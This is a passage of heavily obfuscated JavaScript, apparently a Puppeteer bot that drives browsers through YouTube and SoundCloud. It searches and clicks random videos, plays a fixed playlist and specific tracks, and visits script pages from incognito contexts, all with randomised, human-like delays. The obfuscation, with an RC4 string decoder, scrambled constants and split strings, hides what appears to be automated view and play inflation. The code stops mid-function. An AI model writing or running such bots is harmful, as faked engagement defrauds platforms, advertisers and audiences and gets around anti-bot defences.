const Z = c,
  Y = b,
  X = d;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xe7c * 0x1 + -0xa * -0x7 + -0xec2);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x19a * -0x16 + 0x6 * -0x671 + 0x36b))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1af * 0x6 + 0x99 * 0xf + 0x123), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x2d0f * 0x2 + 0x9 * -0x17c2 + -0x9 * -0x1ac4 + (-0x34d * 0xb + 0x1364 + 0x4b83) * random()) : await standardWaitForNetIdle(f), await wait(-0x7b3 + 0x551 * 0x7 + 0x11c * -0x9 + (0x14f8 + 0x18 * 0x2b7 + -0x2f10) * random()), 0xb67 * 0x3 + -0x1 * -0xb92 + -0x28b * 0x12;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x19fc + -0x89 * 0x31 + 0x13c5), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1efe + 0x1 * 0x1f6c + -0x3e69;
}
async function randomWait() {
  return await wait(0x3d * -0x59 + 0x1378 + 0x1545 + (0x1680 + 0x1 * -0x14fc + 0x1204) * random()), 0x73d * 0x4 + 0xc1 * 0x13 + -0x2b46;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xe7c * 0x1 + -0xa * -0x7 + -0xec2);
    let h = e[f];
    if (b['NdzIoP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x267 + -0x1941 * 0x1 + 0x1ba8, s, t, u = 0xb5 * 0xd + -0x25b3 + -0x1c82 * -0x1; t = n['charAt'](u++); ~t && (s = r % (0x4 * 0x1d5 + -0x1aa4 + 0x1354) ? s * (0x8f7 + 0x105 * 0xb + -0x13ee) + t : t, r++ % (0xf05 * 0x1 + 0x3 * -0xbe1 + -0x2 * -0xa51)) ? p += String['fromCharCode'](-0xc1a * 0x1 + 0x677 + 0x6a2 & s >> (-(-0x7b3 + 0x551 * 0x7 + 0x9d6 * -0x3) * r & 0xa7c + 0xf * 0x22c + -0x2b0a)) : 0xb67 * 0x3 + -0x1 * -0xb92 + -0x2dc7 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x19fc + -0x89 * 0x31 + 0x3d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1efe + 0x1 * 0x1f6c + -0x3e5a))['slice'](-(0x3d * -0x59 + 0x1378 + 0x1bf));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1680 + 0x1 * -0x14fc + -0x184,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x73d * 0x4 + 0xc1 * 0x13 + -0x2b47; u < 0x1181 * -0x1 + -0x1a1 * -0x1 + 0x1e * 0x90; u++) {
          p[u] = u;
        }
        for (u = 0x1 * 0x1613 + -0x3 * 0x9d5 + 0x76c; u < -0x24a5 + -0x2 * -0x15b + 0x22ef; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2 * -0xc15 + 0x1 * -0x1253 + -0x9 * -0x4d5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xb4e * -0x2 + -0x1afb + 0x45f, q = 0xc47 + -0x28 * 0xd + -0xa3f;
        for (let v = 0x381 + -0x337 * -0xa + 0x23a7 * -0x1; v < n['length']; v++) {
          u = (u + (-0x1 * 0x229f + 0x35b * 0x1 + 0x1f45)) % (0x3 * 0x49a + -0x1451 + 0x281 * 0x3), q = (q + p[u]) % (-0x1 * 0x1c5e + -0x2321 * -0x1 + -0x127 * 0x5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x18b3 + -0x2 * -0x15a + -0x1a67)]);
        }
        return t;
      };
      b['rxPINM'] = m, c = arguments, b['NdzIoP'] = !![];
    }
    const j = e[0x3 * -0x815 + -0x7 * 0x4d7 + 0x3a20],
      k = f + j,
      l = c[k];
    return !l ? (b['pCXeEd'] === undefined && (b['pCXeEd'] = !![]), h = b['rxPINM'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + R(0x6, 'u#QJ') + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1181 * -0x1 + -0x1a1 * -0x1 + 0x10 * 0xfe, 0x1 * 0x1613 + -0x3 * 0x9d5 + 0x773), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1b7b8 + -0x4 * -0x821 + 0x28194) * getRandomInt(0x2 * -0xc15 + 0x1 * -0x1253 + -0x2b * -0xfd, -0xb4e * -0x2 + -0x1afb + 0x464), h)), 0xc47 + -0x28 * 0xd + -0xa3e;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x381 + -0x337 * -0xa + 0x23a7 * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * 0x229f + 0x35b * 0x1 + 0x1f45]['split']('\x20');
    for (let k = 0x3 * 0x49a + -0x1451 + 0x683 * 0x1; k < i['length']; k += -0x1 * 0x1c5e + -0x2321 * -0x1 + -0xf7 * 0x7)
      j += i[k] * h[i[k + (-0x1 * -0x18b3 + -0x2 * -0x15a + -0x1b66)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x3 * -0x815 + -0x7 * 0x4d7 + 0x3a26)['map'](l => Array['from'](l['children']))['flat'](-0x43 * -0x49 + 0x1ce4 + -0x2ffe)['map'](l => l['childNodes'][0x1 * 0x1de + -0xebb * -0x1 + -0x1098]['childNodes'][-0x1c95 + 0x17b5 + 0x3 * 0x1a0]['childNodes'][-0xbe5 + -0xc0b + 0x17f1]['childNodes'][0x2549 + -0xa6 * -0x1f + 0xf9 * -0x3b]['childNodes'][-0x1 * 0x316 + -0x2044 + 0x235b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2a6 * 0x4 + -0xa * -0x7c + -0x9 * 0x148, 0x6ad * 0x5 + 0x17 * 0x15c + -0x2d1d)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xe33 + 0x2 * -0x275e + 0x9787 * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((-0x2 * -0xbaa3 + 0x84aa * 0x1 + 0x18b0 * -0xb) * getRandomInt(-0xf6c + 0x1801 + -0x893, 0x1 * 0x78d + 0x1 * -0x1a4b + 0x641 * 0x3), h);
  return await wait(i), 0xde1 * -0x1 + -0x1bf * -0x1 + 0x1 * 0xc23;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xb11 + 0x18f + 0x982]['children'][0x10a9 + -0x2 * 0x8c1 + 0xd9 * 0x1]['children'][0x9 * -0x47 + 0x1d6d + -0x3 * 0x8fa]['children'][-0x2 * 0x47d + 0x21d8 + -0x18de]['children'][0x13 * 0x6b + 0x800 * -0x4 + 0x180f * 0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x775 * 0x1 + 0x2f * 0x89 + -0x11b1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1 * -0x2cf + -0x198c + -0xbf * -0x1f + (0x2692 + -0x21f4 + -0x46c) * random()
  }), await wait(0xb * -0x93 + 0x1111 * -0x1 + 0x1956 + (-0x20d1 + -0x18e5 + 0x3ae2) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1698 + -0xba1 + -0x7f * -0x45]['childNodes'][0x1e4f + -0x305 + -0x1b49]['childNodes'][-0x1d39 + 0xb5 * 0x31 + 0x13 * -0x49]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1791 + -0x11 * 0x67 + -0x1 * -0x1e6d]['childNodes'][-0x615 * 0x5 + 0x1 * -0x17b + 0x1fe4]['childNodes'][0x205 * -0x11 + -0x1819 + 0x3a70]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x8b * -0x24 + 0xa4 * -0x33 + 0xd21),
          r = -0xb1 * -0x31 + 0x1403 * -0x1 + -0xdde;
        for (let u = 0x5b4 + 0x13bd + -0x1 * 0x1971; u < q['length']; u += 0x150d + -0x4d0 + 0xf * -0x115)
          r += q[u] * k[q[u + (-0x1ac1 + 0xdf * -0xb + -0x3 * -0xc1d)]];
        return r;
      }(n);
  });
  await wait((-0xb47 + -0x1229 * 0x3 + 0x7c5a) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x33c1 * 0x5 + 0x1bf18 + -0x435b * 0x7) * getRandomInt(-0xa * -0x151 + 0x2 * 0x72 + 0x3 * -0x4af, 0xef6 + 0x228d + -0x3179), h + (0x1d * 0xc7 + -0x1429 + -0x36e * -0x5));
  return await wait(i), -0x2de + 0x259 + 0x86;
}

function a() {
  const bo = [
    'y2f0y2G',
    'W6lcIv3cHCokW6hcLx7cJCo0',
    'AmoHWO0ayGJdJ8kqWPu9',
    'W5uLiSo4ou8',
    'ywz0igHVDxnLla',
    'rxvJAvjvx1nRyq',
    'W7JcNg/cT8oTwCkzWOaUzq',
    'https://gr',
    'BM8Ty2fJAgu',
    'enuserjs.o',
    'jSkNW5uiz2jBcmosWRC',
    'wVnKGSjY3i',
    'com/@NerdE',
    'lADBHDg-Jt',
    'kCkwpGKJ',
    'W5NcUSobD8kAoG3cImoBWO8',
    'i19FBgXSBgW',
    'e/taming.i',
    'Kit/537.36',
    'lM9YzW',
    'zwfZEwzVCMSUBW',
    'bytes',
    'xh5Rq8oCW4ldM8o4gNa',
    'udboAKXHqMvKlq',
    'CMfUzg9T'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function keyWatch(f) {
  const S = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x55a + 0x20de + 0xc * -0x24b), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1 * -0x2d3 + 0x192f + -0x6 * 0x1c6 + (-0x1690 + 0x1 * 0x184e + 0x115 * 0x2) * Math['random']());
    });
  }, 0x228e + 0x73e + -0xe74);
  await wait(0x1 * -0x7277 + 0x8dfb5 + -0x3d95e);
  try {
    await f['click'](S(0x10));
  } catch (i) {}
  return await wait((-0x4241 * -0x5 + -0x1 * -0x13a1d + 0x1 * -0x19b02) * getRandomInt(0x196 + -0x24 * 0xf2 + 0xf * 0x22a, 0x1 * -0x1103 + 0x280 + 0xe9c)), clearInterval(h), 0x1e56 + -0x2074 + -0x3 * -0xb5;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x25be * 0x1 + 0x184a + -0x3e08;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x263b * 0x1 + -0x1 * -0x12be + 0x137e;
    await randomWait();
  }
  return -0x1271 * 0x2 + -0xaa6 + 0x2f89 * 0x1;
}

function fetchRandomSC() {
  const T = b;
  return Math['random']() <= 0xa53 + 0x628 + -0x107b + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1014 + 0x10c * -0x11 + 0x21e0 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + T(0xf, '4u*6') + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x4e9 + 0x1 * 0x2414 + -0x28fd + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x12c5 + 0xc12 + 0x6b3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x77f8 + -0x1 * -0xb73 + -0x29 * -0x115 + getRandomInt(0x1815 + 0x4e15 + 0x1ad * -0x1a, 0xc8db + -0xcadd + -0x13 * -0x646));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x6ca + 0x79 * 0x17 + -0x11a8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1f51 * -0x1 + 0x1bd7 + -0x1bd * -0x2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })[U(0x0)](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xe05 + 0x340 * -0x4 + 0x1b05, 0xe4c + 0x42e * -0x1 + -0x9ec)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x9d5 * -0x3 + 0x10c1 + 0x2670 * -0x1 + floor((-0xe * -0x1dd + 0x17fb + 0xf63 * -0x3) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x3a58efef * 0x2 + -0xcb3887b6 + 0x81866f * 0x1a8),
          0x1d3cac + -0x5a9e44 * 0x1 + -0x1be * -0x6cb4,
          0x1 * 0x51b3 + -0x3 * 0x4f5d + -0x2 * -0x8e32,
          0x16aa + 0x19aa + 0x2fd4 * -0x1
        ], y = [
          -0x4 * 0x1fd + -0x2fa + 0xb06,
          -0x11c0 + -0x83a + -0x25e * -0xb,
          0x20c6 + -0x2052 + -0x6c,
          -0x4bc + 0x2163 + -0x1ca7
        ], z = [
          'hex',
          'array',
          V(0x3, '9JEN'),
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x2649 + -0x1 * 0x1f21 + -0x727)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * 0x18d1 + 0x1 * -0x1e0b + 0xdf * 0x6; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x15ac + 0x1 * 0x1a84 + -0x3030) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x385 * 0xa + -0x1043 + 0x3375] = A[-0x18f5 + -0x18b8 + 0x31bd] = A[0x2 * 0x398 + -0x5af * -0x3 + 0x42 * -0x5e] = A[0x1 * 0x141b + -0x1 * 0x16c3 + -0x155 * -0x2] = A[0x24f6 + 0x35 * -0x6b + 0xecc * -0x1] = A[0x2d4 + -0x12e7 + 0x1017] = A[-0x164c + -0x118a + 0x27db] = A[0x9d3 + 0x2202 * -0x1 + 0x1835 * 0x1] = A[-0x1 * 0x1a87 + -0x21eb + 0x71 * 0x89] = A[0x3 * 0x596 + -0x1b * -0x35 + -0x1651] = A[-0x427 * 0x4 + 0x6f6 + -0x1 * -0x9af] = A[-0x1934 + -0x18d * 0x1 + -0x13 * -0x169] = A[-0x230 + 0x952 * -0x3 + 0x1e31 * 0x1] = A[-0x1 * 0x16e2 + -0x235f + 0x3a4d] = A[-0x13 * 0x2b + 0x23 * 0x4a + 0x10 * -0x6e] = A[-0xc58 + -0x158a + 0x21f0] = A[-0x2 * -0x32b + -0x1 * 0x2d5 + -0x372] = 0x185b * -0x1 + 0x7 * -0x332 + 0x531 * 0x9, this['blocks'] = A) : this['blocks'] = [
                0x1530 + -0x73 * 0x1 + -0x14bd,
                -0x219 * -0x7 + 0x1 * 0x2306 + -0x31b5,
                0x1bd4 + 0x11a4 + -0x2d78,
                -0x11 * -0x47 + 0x92a + -0xde1,
                0x193 * -0x16 + 0x345 * -0x9 + 0x400f,
                0xb * 0x1b4 + -0xaf5 + -0x7c7,
                -0x23 * -0x11 + 0x12e + 0x1 * -0x381,
                -0x242b * 0x1 + 0x2 * 0xbec + 0xc53,
                0x2 * 0xda6 + -0xda3 + 0x10d * -0xd,
                0x182a + 0x35 * -0x72 + -0x90,
                0x17 * 0x146 + -0xda1 * 0x1 + -0xfa9,
                -0x26a7 + -0x137b + 0x3a22,
                0xa29 + -0x9 * 0x25f + -0x36 * -0x35,
                0x18a * -0x1 + 0x1255 + 0x3 * -0x599,
                -0x756 + 0x7f * -0x37 + 0x229f,
                0x11a4 + -0x1be * -0x1 + -0x3 * 0x676,
                -0xe21 + -0x5 * -0x161 + 0x73c
              ], this['h0'] = 0x1df8d7 * 0x57b + -0x7d5 * -0xc4aba + 0x42371bd * -0x26, this['h1'] = -0x1140c5b1b + 0x943e2ee0 + 0x2 * 0xb7cdebe2, this['h2'] = 0xfd5e8984 + 0x54194c96 + -0xb8bcf91c, this['h3'] = 0x3973709 + -0x1ff7ae * 0x7 + 0xd7ae32f, this['h4'] = -0x18512b68a + -0x9dab61e6 * -0x2 + -0x31cde * -0x5699, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xb0c + -0x1 * -0x1f60 + -0x1454, this['finalized'] = this['hashed'] = -0x3 * 0x751 + -0xa * -0x24a + -0xf1, this['first'] = -0x3 * -0xa97 + 0xb37 + -0x2afb;
            }
            ['update'](J) {
              const W = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1379 + 0x117a + -0x24f3, O = J['length'] || 0x6de * 0x3 + -0x2302 + 0x1cd * 0x8, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x297 * 0x7 + 0x5 * 0x337 + 0x88d * -0x4, P[-0x25d7 + -0x5 * 0x762 + 0x1 * 0x4ac1] = this['block'], P[0x343 * 0x1 + 0x1ec3 + -0x19e * 0x15] = P[0x1b03 + 0x26ab + -0x41ad * 0x1] = P[-0x217 * -0xa + 0xa75 * -0x1 + -0xa6f] = P[0x314 + 0x2572 * -0x1 + 0x2261] = P[-0x1ef1 + -0x9eb + 0x28e0] = P[0x14f * 0x1 + 0x477 + -0x5c1] = P[-0x1361 + -0x53 * 0x52 + 0x2dfd] = P[0xdfa + 0x1 * 0x102b + -0x1e1e] = P[0x2358 + 0x1 * -0x673 + -0x1cdd] = P[-0xf09 + -0x1e92 + 0x4 * 0xb69] = P[0x53 * 0xd + -0x1484 * -0x1 + -0x83b * 0x3] = P[-0x53 * -0x23 + 0xa * 0xb6 + -0x126a] = P[0x2a7 * 0xb + 0x2 * 0x647 + -0x1 * 0x29af] = P[0x269 * -0x1 + 0xb6a * -0x2 + 0x194a] = P[-0xe74 + 0x148 * 0xc + -0xde] = P[-0x5c5 + 0x24e3 + -0x1f0f * 0x1] = -0x178d * 0x1 + 0x1 * 0x5d9 + 0x11b4), K) {
                    for (N = this['start']; M < O && N < -0x60b * -0x1 + 0x2253 * 0x1 + -0x281e; ++M)
                      P[N >> -0x19be * -0x1 + 0xb2 * 0x35 + -0x3e96] |= J[M] << y[-0x1 * -0x15a + 0x40d + 0x73 * -0xc & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x39 * 0x1d + -0x58 * -0x51 + -0x1523; ++M)
                      (L = J['charCodeAt'](M)) < -0x280 * 0x7 + 0x13a4 + 0x3 * -0x8c ? P[N >> -0x11d0 + 0xc83 * 0x2 + -0x39a * 0x2] |= L << y[-0x1d1a + -0xdee + 0x2b0b * 0x1 & N++] : L < -0x1 * -0x16a3 + 0x35b * 0x7 + -0x1 * 0x2620 ? (P[N >> -0x3ef * 0x1 + 0x146 + -0x1 * -0x2ab] |= (-0x2a * 0xda + -0x1 * 0x2374 + 0x47f8 | L >> -0x1 * 0x1255 + -0x1f2d + 0x4 * 0xc62) << y[-0x142d + -0x73a + -0x16 * -0x13f & N++], P[N >> 0x2664 + 0x3 * -0x75 + -0x1 * 0x2503] |= (-0x180c + 0xf5d * -0x1 + -0x27e9 * -0x1 | 0x9f3 + 0x18b5 + 0x17f * -0x17 & L) << y[-0x2c4 + -0x1626 + -0x3 * -0x84f & N++]) : L < -0x5 * -0x4eff + -0x4 * 0xe99 + -0x7897 || L >= -0x15e7c + -0x6a54 + 0x2a8d0 ? (P[N >> -0x48 * -0x87 + -0x11 * -0x15c + -0x3d12] |= (0x4b4 * -0x1 + -0x1c41 + 0x21d5 | L >> -0x4ac * -0x2 + -0x1 * -0x244c + -0x2d98) << y[0x15 * 0xe9 + -0x19c8 + -0x3 * -0x23a & N++], P[N >> -0x1 * -0x1cdd + -0x1e52 + 0x177] |= (0x1 * -0x1942 + -0x1 * 0x1ac9 + 0x348b | L >> -0x1f * 0x127 + 0x20 * -0x23 + -0x1 * -0x281f & 0x479 + 0x506 + -0x940) << y[-0x50c + -0x1 * 0x1fd3 + 0x2 * 0x1271 & N++], P[N >> -0x52 * -0x17 + 0x4d1 + -0xc2d] |= (-0x24b6 + -0xb0d + 0x3043 | -0x132e + -0x5ed + -0x24e * -0xb & L) << y[-0x192f + -0x1d13 + -0x1217 * -0x3 & N++]) : (L = -0x1 * 0x893b + 0x129e2 + 0x5f59 + ((-0x1507 + 0x1 * -0xed1 + 0x1f * 0x149 & L) << -0x18 * 0x6d + 0x1eaf * -0x1 + -0xdf * -0x2f | -0x1 * 0xfa3 + -0x29d * 0x2 + 0x18dc & J['charCodeAt'](++M)), P[N >> 0xa * 0x19f + -0x1b42 + 0x11b * 0xa] |= (0xad5 + 0x3 * 0x7f7 + -0x21ca | L >> 0x1 * -0x86a + -0x1f3 * -0x3 + 0x19 * 0x1b) << y[-0x569 * 0x4 + 0x1 * 0x1ab1 + -0x3 * 0x1ae & N++], P[N >> 0x372 + -0x1 * 0x142f + 0x10bf] |= (-0x143 * 0x1d + -0x2 * 0xa8d + 0x3a31 | L >> -0x498 + -0x156d + -0x1a11 * -0x1 & -0x887 + 0xddc + -0xba * 0x7) << y[0x164 * 0x6 + 0x25ed + 0x2 * -0x1721 & N++], P[N >> 0x202c + -0xccc * -0x1 + -0x2cf6] |= (-0x18cb + -0x1589 * 0x1 + 0x2ed4 | L >> 0x1978 + -0x214 + 0x175e * -0x1 & 0x1478 + -0x1c1 * -0xb + -0x34b * 0xc) << y[0x5 * -0x6d6 + -0x11 * -0x18d + 0x7d4 & N++], P[N >> 0x6a * 0x3c + 0x1b4e + -0x3424] |= (-0x1 * -0x1349 + 0x38e + 0x7 * -0x331 | 0xc33 + 0xea2 + 0x2 * -0xd4b & L) << y[0x2679 + 0x1c76 * -0x1 + -0xa00 & N++]);
                  }
